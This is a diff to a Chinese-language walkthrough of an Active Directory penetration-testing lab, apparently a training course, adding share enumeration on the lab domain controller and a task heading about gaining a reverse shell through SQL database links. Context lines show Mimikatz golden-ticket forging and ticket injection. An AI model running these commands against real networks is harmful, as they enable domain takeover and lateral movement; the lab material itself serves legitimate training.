@@ -2540,6 +2540,17 @@ Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarco
 .\kirbikator.exe lsa .\CIFS.eurocorp-dc.eurocorp.local.kirbi
 ```
 
+枚举eurocorp-dc的分享文件夹
+```
+PS C:\ad\kekeo_old> Invoke-ShareFinder -ComputerName eurocorp-dc.eurocorp.local
+\\eurocorp-dc.eurocorp.local\ADMIN$     - Remote Admin
+\\eurocorp-dc.eurocorp.local\C$         - Default share
+\\eurocorp-dc.eurocorp.local\IPC$       - Remote IPC
+\\eurocorp-dc.eurocorp.local\NETLOGON   - Logon server share
+\\eurocorp-dc.eurocorp.local\SharedwithDCorp    -
+\\eurocorp-dc.eurocorp.local\SYSVOL     - Logon server share
+```
+
 查看目标计算机里的SharedwithDCorp文件夹
 ```
 ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
@@ -2557,3 +2568,13 @@ ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
 ```
 ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
 ```
+
+
+# Learning Objective 22:
+Task
+● Get a reverse shell on a SQL server in eurocorp forest by abusing database links from dcorp-mssql.
+
+
+
+
+
